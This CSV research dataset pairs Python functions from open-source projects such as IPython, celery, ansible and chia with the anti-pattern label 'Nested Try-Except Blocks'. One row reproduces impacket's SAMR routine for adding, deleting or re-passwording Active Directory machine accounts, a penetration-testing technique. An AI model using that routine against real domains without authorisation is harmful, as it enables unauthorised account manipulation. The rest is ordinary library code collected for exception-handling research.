,project,file,function,func_body,anti_pattern,count
235,ipython,/home/r4ph/desenv/exception-miner/projects/py/ipython/IPython/core/ultratb.py,text_repr,"def text_repr(value):
    """"""Hopefully pretty robust repr equivalent.""""""
    # this is pretty horrible but should always return *something*
    try:
        return pydoc.text.repr(value)  # type: ignore[call-arg]
    except KeyboardInterrupt:
        raise
    except:
        try:
            return repr(value)
        except KeyboardInterrupt:
            raise
        except:
            try:
                # all still in an except block so we catch
                # getattr raising
                name = getattr(value, '__name__', None)
                if name:
                    # ick, recursion
                    return text_repr(name)
                klass = getattr(value, '__class__', None)
                if klass:
                    return '%s instance' % text_repr(klass)
            except KeyboardInterrupt:
                raise
            except:
                return 'UNRECOVERABLE REPR FAILURE'",Nested Try-Except Blocks,1
236,jinja,/home/r4ph/desenv/phd/exception-miner/projects/py/jinja/src/jinja2/environment.py,getitem,"def getitem(
        self, obj: t.Any, argument: t.Union[str, t.Any]
    ) -> t.Union[t.Any, Undefined]:
        """"""Get an item or attribute of an object but prefer the item.""""""
        try:
            return obj[argument]
        except (AttributeError, TypeError, LookupError):
            if isinstance(argument, str):
                try:
                    attr = str(argument)
                except Exception:
                    pass
                else:
                    try:
                        return getattr(obj, attr)
                    except AttributeError:
                        pass
            return self.undefined(obj=obj, name=argument)",Nested Try-Except Blocks,1
237,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/app/builtins.py,unlock_chord,"def unlock_chord(self, group_id, callback, interval=None,
                     max_retries=None, result=None,
                     Result=app.AsyncResult, GroupResult=app.GroupResult,
                     result_from_tuple=result_from_tuple, **kwargs):
        if interval is None:
            interval = self.default_retry_delay

        # check if the task group is ready, and if so apply the callback.
        callback = maybe_signature(callback, app)
        deps = GroupResult(
            group_id,
            [result_from_tuple(r, app=app) for r in result],
            app=app,
        )
        j = deps.join_native if deps.supports_native_join else deps.join

        try:
            ready = deps.ready()
        except Exception as exc:
            raise self.retry(
                exc=exc, countdown=interval, max_retries=max_retries,
            )
        else:
            if not ready:
                raise self.retry(countdown=interval, max_retries=max_retries)

        callback = maybe_signature(callback, app=app)
        try:
            with allow_join_result():
                ret = j(
                    timeout=app.conf.result_chord_join_timeout,
                    propagate=True,
                )
        except Exception as exc:  # pylint: disable=broad-except
            try:
                culprit = next(deps._failed_join_report())
                reason = f'Dependency {culprit.id} raised {exc!r}'
            except StopIteration:
                reason = repr(exc)
            logger.exception('Chord %r raised: %r', group_id, exc)
            app.backend.chord_error_from_stack(callback, ChordError(reason))
        else:
            try:
                callback.delay(ret)
            except Exception as exc:  # pylint: disable=broad-except
                logger.exception('Chord %r raised: %r', group_id, exc)
                app.backend.chord_error_from_stack(
                    callback,
                    exc=ChordError(f'Callback error: {exc!r}'),
                )",Nested Try-Except Blocks,1
238,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/server/compiler_pool/worker_proc.py,main,"def main(get_handler):
    parser = argparse.ArgumentParser()
    parser.add_argument(""--sockname"")
    parser.add_argument(""--numproc"")
    parser.add_argument(""--version-serial"", type=int)
    args = parser.parse_args()

    ql_parser.preload_spec()
    gc.freeze()

    listen_for_debugger()

    if args.numproc is None:
        # Run a single worker process
        run_worker(args.sockname, args.version_serial, get_handler)
        return

    numproc = int(args.numproc)
    assert numproc >= 1

    # Abort the template process if more than `max_worker_spawns`
    # new workers are created continuously - it probably means the
    # worker cannot start correctly.
    max_worker_spawns = numproc * 2

    children = set()
    continuous_num_spawns = 0

    for _ in range(int(args.numproc)):
        # spawn initial workers
        if pid := os.fork():
            # main process
            children.add(pid)
            continuous_num_spawns += 1
        else:
            # child process
            break
    else:
        # main process - redirect SIGTERM to SystemExit and wait for children
        signal.signal(signal.SIGTERM, lambda *_: exit(os.EX_OK))
        last_spawn_timestamp = time.monotonic()

        try:
            while children:
                pid, status = os.wait()
                children.remove(pid)
                ec = os.waitstatus_to_exitcode(status)
                if ec > 0 or -ec not in {0, signal.SIGINT}:
                    # restart the child process if killed or ending abnormally,
                    # unless we tried too many times continuously
                    now = time.monotonic()
                    if now - last_spawn_timestamp > NUM_SPAWNS_RESET_INTERVAL:
                        continuous_num_spawns = 0
                    last_spawn_timestamp = now
                    continuous_num_spawns += 1
                    if continuous_num_spawns > max_worker_spawns:
                        # GOTCHA: we shouldn't return here because we need the
                        # exception handler below to clean up the workers
                        exit(os.EX_UNAVAILABLE)

                    if pid := os.fork():
                        # main process
                        children.add(pid)
                    else:
                        # child process
                        break
            else:
                # main process - all children ended normally
                return
        except BaseException as e:  # includes SystemExit and KeyboardInterrupt
            # main process - kill and wait for the remaining workers to exit
            try:
                signal.signal(signal.SIGTERM, signal.SIG_DFL)
                for pid in children:
                    try:
                        os.kill(pid, signal.SIGTERM)
                    except OSError:
                        pass
                try:
                    while children:
                        pid, status = os.wait()
                        children.discard(pid)
                except OSError:
                    pass
            finally:
                raise e

    # child process - clear the SIGTERM handler for potential Rust impl
    signal.signal(signal.SIGTERM, signal.SIG_DFL)
    run_worker(args.sockname, args.version_serial, get_handler)",Nested Try-Except Blocks,1
239,bup,/home/r4ph/desenv/phd/exception-miner/projects/py/bup/lib/bup/client.py,close,"def close(self):
        if self.closed:
            return
        self.closed = True
        try:
            if self.conn and not self._busy:
                self.conn.write(b'quit\n')
        finally:
            try:
                if self.pin:
                    self.pin.close()
            finally:
                try:
                    self.pin = None
                    if self.sock and self.sockw:
                        self.sockw.close()
                        self.sock.shutdown(socket.SHUT_WR)
                finally:
                    try:
                        if self.conn:
                            self.conn.close()
                    finally:
                        try:
                            self.conn = None
                            if self.pout:
                                self.pout.close()
                        finally:
                            try:
                                self.pout = None
                                if self.sock:
                                    self.sock.close()
                            finally:
                                self.sock = None
                                if self.p:
                                    self.p.wait()
                                    rv = self.p.wait()
                                    if rv:
                                        raise ClientError('server tunnel returned exit code %d' % rv)
                                self.p = None",Nested Try-Except Blocks,1
240,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/lib/ansible/modules/file.py,check_owner_exists,"def check_owner_exists(module, owner):
    try:
        uid = int(owner)
        try:
            getpwuid(uid).pw_name
        except KeyError:
            module.warn('failed to look up user with uid %s. Create user up to this point in real play' % uid)
    except ValueError:
        try:
            getpwnam(owner).pw_uid
        except KeyError:
            module.warn('failed to look up user %s. Create user up to this point in real play' % owner)",Nested Try-Except Blocks,1
241,great,/home/r4ph/desenv/phd/exception-miner/projects/py/great_expectations/great_expectations/dataset/pandas_dataset.py,_expect_column_values_to_be_in_type_list__aggregate,"def _expect_column_values_to_be_in_type_list__aggregate(  # noqa: PLR0913, PLR0912
        self,
        column,
        type_list,
        mostly=None,
        result_format=None,
        row_condition=None,
        condition_parser=None,
        include_config=True,
        catch_exceptions=None,
        meta=None,
    ):
        if mostly is not None:
            raise ValueError(
                ""PandasDataset cannot support mostly for a column with a non-object dtype.""
            )

        if type_list is None:
            success = True
        else:
            comp_types = []
            for type_ in type_list:
                try:
                    comp_types.append(np.dtype(type_).type)
                except TypeError:
                    try:
                        pd_type = getattr(pd, type_)
                        if isinstance(pd_type, type):
                            comp_types.append(pd_type)
                    except AttributeError:
                        pass

                    try:
                        pd_type = getattr(pd.core.dtypes.dtypes, type_)
                        if isinstance(pd_type, type):
                            comp_types.append(pd_type)
                    except AttributeError:
                        pass

                native_type = self._native_type_type_map(type_)
                if native_type is not None:
                    comp_types.extend(native_type)

            success = self[column].dtype.type in comp_types

        return {
            ""success"": success,
            ""result"": {""observed_value"": self[column].dtype.type.__name__},
        }",Nested Try-Except Blocks,1
242,avatarify,/home/r4ph/desenv/phd/exception-miner/projects/py/avatarify/afy/predictor_worker.py,recv_worker,"def recv_worker(port, recv_queue, worker_alive):
        timing = AccumDict()
        log = Logger('./var/log/recv_worker.log', verbose=opt.verbose)

        ctx = SerializingContext()
        socket = ctx.socket(zmq.PULL)
        socket.bind(f""tcp://*:{port}"")
        socket.RCVTIMEO = RECV_TIMEOUT

        log(f'Receiving on port {port}', important=True)

        try:
            while worker_alive.value:
                tt = TicToc()

                try:
                    tt.tic()
                    msg = socket.recv_data()
                    timing.add('RECV', tt.toc())
                except zmq.error.Again:
                    log(""recv timeout"")
                    continue

                #log('recv', msg[0])

                method, data = msg
                if method['critical']:
                    recv_queue.put(msg)
                else:
                    try:
                        recv_queue.put(msg, block=False)
                    except queue.Full:
                        log('recv_queue full')

                Once(timing, log, per=1)
        except KeyboardInterrupt:
            log(""recv_worker: user interrupt"", important=True)

        worker_alive.value = 0
        log(""recv_worker exit"", important=True)",Nested Try-Except Blocks,1
243,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/examples/addcomputer.py,doSAMRAdd,"def doSAMRAdd(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        servHandle = None
        domainHandle = None
        userHandle = None
        try:
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            samrConnectResponse = samr.hSamrConnect5(dce, '\\\\%s\x00' % self.__target,
                samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN )
            servHandle = samrConnectResponse['ServerHandle']

            samrEnumResponse = samr.hSamrEnumerateDomainsInSamServer(dce, servHandle)
            domains = samrEnumResponse['Buffer']['Buffer']
            domainsWithoutBuiltin = list(filter(lambda x : x['Name'].lower() != 'builtin', domains))

            if len(domainsWithoutBuiltin) > 1:
                domain = list(filter(lambda x : x['Name'].lower() == self.__domainNetbios, domains))
                if len(domain) != 1:
                    logging.critical(""This server provides multiple domains and '%s' isn't one of them."", self.__domainNetbios)
                    logging.critical(""Available domain(s):"")
                    for domain in domains:
                        logging.error("" * %s"" % domain['Name'])
                    logging.critical(""Consider using -domain-netbios argument to specify which one you meant."")
                    raise Exception()
                else:
                    selectedDomain = domain[0]['Name']
            else:
                selectedDomain = domainsWithoutBuiltin[0]['Name']

            samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(dce, servHandle, selectedDomain)
            domainSID = samrLookupDomainResponse['DomainId']

            if logging.getLogger().level == logging.DEBUG:
                logging.info(""Opening domain %s..."" % selectedDomain)
            samrOpenDomainResponse = samr.hSamrOpenDomain(dce, servHandle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER , domainSID)
            domainHandle = samrOpenDomainResponse['DomainHandle']


            if self.__noAdd or self.__delete:
                try:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000073:
                        raise Exception(""Account %s not found in domain %s!"" % (self.__computerName, selectedDomain))
                    else:
                        raise

                userRID = checkForUser['RelativeIds']['Element'][0]
                if self.__delete:
                    access = samr.DELETE
                    message = ""delete""
                else:
                    access = samr.USER_FORCE_PASSWORD_CHANGE
                    message = ""set password for""
                try:
                    openUser = samr.hSamrOpenUser(dce, domainHandle, access, userRID)
                    userHandle = openUser['UserHandle']
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000022:
                        raise Exception(""User %s doesn't have right to %s %s!"" % (self.__username, message, self.__computerName))
                    else:
                        raise
            else:
                if self.__computerName is not None:
                    try:
                        checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        raise Exception(""Account %s already exists! If you just want to set a password, use -no-add."" % self.__computerName)
                    except samr.DCERPCSessionError as e:
                        if e.error_code != 0xc0000073:
                            raise
                else:
                    foundUnused = False
                    while not foundUnused:
                        self.__computerName = self.generateComputerName()
                        try:
                            checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        except samr.DCERPCSessionError as e:
                            if e.error_code == 0xc0000073:
                                foundUnused = True
                            else:
                                raise

                try:
                    createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000022:
                        raise Exception(""User %s doesn't have right to create a machine account!"" % self.__username)
                    elif e.error_code == 0xc00002e7:
                        raise Exception(""User %s machine quota exceeded!"" % self.__username)
                    else:
                        raise

                userHandle = createUser['UserHandle']

            if self.__delete:
                samr.hSamrDeleteUser(dce, userHandle)
                logging.info(""Successfully deleted %s."" % self.__computerName)
                userHandle = None
            else:
                samr.hSamrSetPasswordInternal4New(dce, userHandle, self.__computerPassword)
                if self.__noAdd:
                    logging.info(""Successfully set password of %s to %s."" % (self.__computerName, self.__computerPassword))
                else:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                    userRID = checkForUser['RelativeIds']['Element'][0]
                    openUser = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, userRID)
                    userHandle = openUser['UserHandle']
                    req = samr.SAMPR_USER_INFO_BUFFER()
                    req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
                    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                    samr.hSamrSetInformationUser2(dce, userHandle, req)
                    logging.info(""Successfully added machine account %s with password %s."" % (self.__computerName, self.__computerPassword))

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()

            logging.critical(str(e))
        finally:
            if userHandle is not None:
                samr.hSamrCloseHandle(dce, userHandle)
            if domainHandle is not None:
                samr.hSamrCloseHandle(dce, domainHandle)
            if servHandle is not None:
                samr.hSamrCloseHandle(dce, servHandle)
            dce.disconnect()",Nested Try-Except Blocks,1
244,python-prompt-toolkit,/home/r4ph/desenv/phd/exception-miner/projects/py/python-prompt-toolkit/src/prompt_toolkit/eventloop/async_generator.py,runner,"def runner() -> None:
        """"""
        Consume the generator in background thread.
        When items are received, they'll be pushed to the queue.
        """"""
        try:
            for item in get_iterable():
                # When this async generator was cancelled (closed), stop this
                # thread.
                if quitting:
                    return

                while True:
                    try:
                        q.put(item, timeout=1)
                    except Full:
                        if quitting:
                            return
                        continue
                    else:
                        break

        finally:
            while True:
                try:
                    q.put(_Done(), timeout=1)
                except Full:
                    if quitting:
                        return
                    continue
                else:
                    break",Nested Try-Except Blocks,1
245,spiderfoot,/home/r4ph/desenv/phd/exception-miner/projects/py/spiderfoot/sflib.py,cveInfo,"def cveInfo(self, cveId: str, sources: str = ""circl,nist"") -> (str, str):
        """"""Look up a CVE ID for more information in the first available source.

        Args:
            cveId (str): CVE ID, e.g. CVE-2018-15473
            sources (str): Comma-separated list of sources to query. Options available are circl and nist

        Returns:
            (str, str): Appropriate event type and descriptive text
        """"""
        sources = sources.split("","")
        # VULNERABILITY_GENERAL is the generic type in case we don't have
        # a real/mappable CVE.
        eventType = ""VULNERABILITY_GENERAL""

        def cveRating(score: int) -> str:
            if score == ""Unknown"":
                return None
            if score >= 0 and score <= 3.9:
                return ""LOW""
            if score >= 4.0 and score <= 6.9:
                return ""MEDIUM""
            if score >= 7.0 and score <= 8.9:
                return ""HIGH""
            if score >= 9.0:
                return ""CRITICAL""
            return None

        for source in sources:
            jsondata = self.cacheGet(f""{source}-{cveId}"", 86400)

            if not jsondata:
                # Fetch data from source
                if source == ""nist"":
                    ret = self.fetchUrl(f""https://services.nvd.nist.gov/rest/json/cve/1.0/{cveId}"", timeout=5)
                if source == ""circl"":
                    ret = self.fetchUrl(f""https://cve.circl.lu/api/cve/{cveId}"", timeout=5)

                if not ret:
                    continue

                if not ret['content']:
                    continue

                self.cachePut(f""{source}-{cveId}"", ret['content'])
                jsondata = ret['content']

            try:
                data = json.loads(jsondata)

                if source == ""circl"":
                    score = data.get('cvss', 'Unknown')
                    rating = cveRating(score)
                    if rating:
                        eventType = f""VULNERABILITY_CVE_{rating}""
                        return (eventType, f""{cveId}\n<SFURL>https://nvd.nist.gov/vuln/detail/{cveId}</SFURL>\n""
                                f""Score: {score}\nDescription: {data.get('summary', 'Unknown')}"")

                if source == ""nist"":
                    try:
                        if data['result']['CVE_Items'][0]['impact'].get('baseMetricV3'):
                            score = data['result']['CVE_Items'][0]['impact']['baseMetricV3']['cvssV3']['baseScore']
                        else:
                            score = data['result']['CVE_Items'][0]['impact']['baseMetricV2']['cvssV2']['baseScore']
                        rating = cveRating(score)
                        if rating:
                            eventType = f""VULNERABILITY_CVE_{rating}""
                    except Exception:
                        score = ""Unknown""

                    try:
                        descr = data['result']['CVE_Items'][0]['cve']['description']['description_data'][0]['value']
                    except Exception:
                        descr = ""Unknown""

                    return (eventType, f""{cveId}\n<SFURL>https://nvd.nist.gov/vuln/detail/{cveId}</SFURL>\n""
                            f""Score: {score}\nDescription: {descr}"")
            except BaseException as e:
                self.debug(f""Unable to parse CVE response from {source.upper()}: {e}"")
                continue

        return (eventType, f""{cveId}\nScore: Unknown\nDescription: Unknown"")",Nested Try-Except Blocks,1
246,chia-blockchain,/home/r4ph/desenv/phd/exception-miner/projects/py/chia-blockchain/chia/harvester/harvester_api.py,blocking_lookup,"def blocking_lookup(filename: Path, plot_info: PlotInfo) -> List[Tuple[bytes32, ProofOfSpace]]:
            # Uses the DiskProver object to lookup qualities. This is a blocking call,
            # so it should be run in a thread pool.
            try:
                plot_id = plot_info.prover.get_id()
                sp_challenge_hash = calculate_pos_challenge(
                    plot_id,
                    new_challenge.challenge_hash,
                    new_challenge.sp_hash,
                )
                try:
                    quality_strings = plot_info.prover.get_qualities_for_challenge(sp_challenge_hash)
                except RuntimeError as e:
                    if str(e) == ""Timeout waiting for context queue."":
                        self.harvester.log.warning(
                            f""No decompressor available. Cancelling qualities retrieving for {filename}""
                        )
                        self.harvester.log.warning(
                            f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                            f""plot_info: {plot_info}""
                        )
                    else:
                        self.harvester.log.error(f""Exception fetching qualities for {filename}. {e}"")
                        self.harvester.log.error(
                            f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                            f""plot_info: {plot_info}""
                        )
                    return []
                except Exception as e:
                    self.harvester.log.error(f""Error using prover object {e}"")
                    self.harvester.log.error(
                        f""File: {filename} Plot ID: {plot_id.hex()}, ""
                        f""challenge: {sp_challenge_hash}, plot_info: {plot_info}""
                    )
                    return []

                responses: List[Tuple[bytes32, ProofOfSpace]] = []
                if quality_strings is not None:
                    difficulty = new_challenge.difficulty
                    sub_slot_iters = new_challenge.sub_slot_iters
                    if plot_info.pool_contract_puzzle_hash is not None:
                        # If we are pooling, override the difficulty and sub slot iters with the pool threshold info.
                        # This will mean more proofs actually get found, but they are only submitted to the pool,
                        # not the blockchain
                        for pool_difficulty in new_challenge.pool_difficulties:
                            if pool_difficulty.pool_contract_puzzle_hash == plot_info.pool_contract_puzzle_hash:
                                difficulty = pool_difficulty.difficulty
                                sub_slot_iters = pool_difficulty.sub_slot_iters

                    # Found proofs of space (on average 1 is expected per plot)
                    for index, quality_str in enumerate(quality_strings):
                        required_iters: uint64 = calculate_iterations_quality(
                            self.harvester.constants.DIFFICULTY_CONSTANT_FACTOR,
                            quality_str,
                            plot_info.prover.get_size(),
                            difficulty,
                            new_challenge.sp_hash,
                        )
                        sp_interval_iters = calculate_sp_interval_iters(self.harvester.constants, sub_slot_iters)
                        if required_iters < sp_interval_iters:
                            # Found a very good proof of space! will fetch the whole proof from disk,
                            # then send to farmer
                            try:
                                proof_xs = plot_info.prover.get_full_proof(
                                    sp_challenge_hash, index, self.harvester.parallel_read
                                )
                            except RuntimeError as e:
                                if str(e) == ""GRResult_NoProof received"":
                                    self.harvester.log.info(
                                        f""Proof dropped due to line point compression for {filename}""
                                    )
                                    self.harvester.log.info(
                                        f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                        f""plot_info: {plot_info}""
                                    )
                                elif str(e) == ""Timeout waiting for context queue."":
                                    self.harvester.log.warning(
                                        f""No decompressor available. Cancelling full proof retrieving for {filename}""
                                    )
                                    self.harvester.log.warning(
                                        f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                        f""plot_info: {plot_info}""
                                    )
                                else:
                                    self.harvester.log.error(f""Exception fetching full proof for {filename}. {e}"")
                                    self.harvester.log.error(
                                        f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                        f""plot_info: {plot_info}""
                                    )
                                continue
                            except Exception as e:
                                self.harvester.log.error(f""Exception fetching full proof for {filename}. {e}"")
                                self.harvester.log.error(
                                    f""File: {filename} Plot ID: {plot_id.hex()}, challenge: {sp_challenge_hash}, ""
                                    f""plot_info: {plot_info}""
                                )
                                continue

                            responses.append(
                                (
                                    quality_str,
                                    ProofOfSpace(
                                        sp_challenge_hash,
                                        plot_info.pool_public_key,
                                        plot_info.pool_contract_puzzle_hash,
                                        plot_info.plot_public_key,
                                        uint8(plot_info.prover.get_size()),
                                        proof_xs,
                                    ),
                                )
                            )
                return responses
            except Exception as e:
                self.harvester.log.error(f""Unknown error: {e}"")
                return []",Nested Try-Except Blocks,1
